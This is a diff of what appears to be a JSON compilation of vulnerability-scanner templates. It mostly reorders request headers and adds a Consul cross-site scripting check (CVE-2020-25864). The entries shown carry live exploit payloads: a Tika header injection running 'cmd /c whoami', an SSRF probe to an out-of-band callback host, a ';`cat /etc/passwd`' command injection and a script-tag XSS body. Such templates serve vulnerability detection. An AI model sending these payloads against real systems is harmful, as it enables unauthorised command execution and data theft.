@@ -6051,11 +6051,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -8800,8 +8800,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -10025,8 +10025,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10417,6 +10417,21 @@
           "method": "POST",
           "path": [
             "http://{{Host}}:81/SearchSvc/CVSearchService.svc"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-25864",
+      "info": {
+        "name": "HashiCorp Consul and Consul Enterprise up to version 1.9.4 key-value (KV) raw mode is vulnerable to cross-site scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1\nHost: {{Hostname}}\n\n<!DOCTYPE html><script>alert(document.domain)</script>\n",
+            "GET {{BaseURL}}/v1/kv/{{randstr}}%3Fraw HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
